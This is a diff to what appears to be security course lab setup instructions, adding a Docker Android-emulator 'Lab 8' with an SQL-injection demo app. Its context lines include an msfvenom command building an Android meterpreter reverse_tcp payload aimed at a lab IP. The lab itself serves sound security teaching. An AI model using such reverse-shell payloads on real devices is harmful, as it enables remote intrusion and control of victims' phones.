@@ -233,7 +233,7 @@ $ docker-compose up -d -f docker-compose.yml
 ```
 $ docker exec -it attacker /bin/bash
 ```
- - When all jobs done, terminate all containers by
+ - After all jobs done, terminate all containers by
 
 ```
 $ docker-compose down
@@ -245,3 +245,32 @@ Accordingly, change the IP address used in lab instruction, for example:
 msf> msfvenom -p android/meterpreter/reverse_tcp LHOST=10.9.0.7 LPORT=4444 -f raw -o reverse_tcp.apk
 msf> set lhost 10.9.0.7
 ```
+
+## Lab 8
+
+This lab runs on an android emulator docker all the time.
+
+- Compose File: {Download}`lab8/docker-compose.yml`
+- Dockerfile: {Download}`lab8/Dockerfile`
+- Remote [yangzhou301/lab8](https://hub.docker.com/repository/docker/yangzhou301/lab8)
+- Command:
+  - Start the Docker Compose:
+```
+$ docker-compose up -d -f docker-compose.yml
+```
+  - Check if the Android emulator runs properly on [http://localhost:6080](http://localhost:6080)
+  - Install `sql-inject-demo.apk` on it:
+
+```
+$ docker exec -it mobile /bin/bash
+# adb install lab8/sql-inject-demo.apk
+# exit
+```
+
+  - After all jobs done, terminate all containers by
+
+```
+$ docker-compose down
+```
+
+
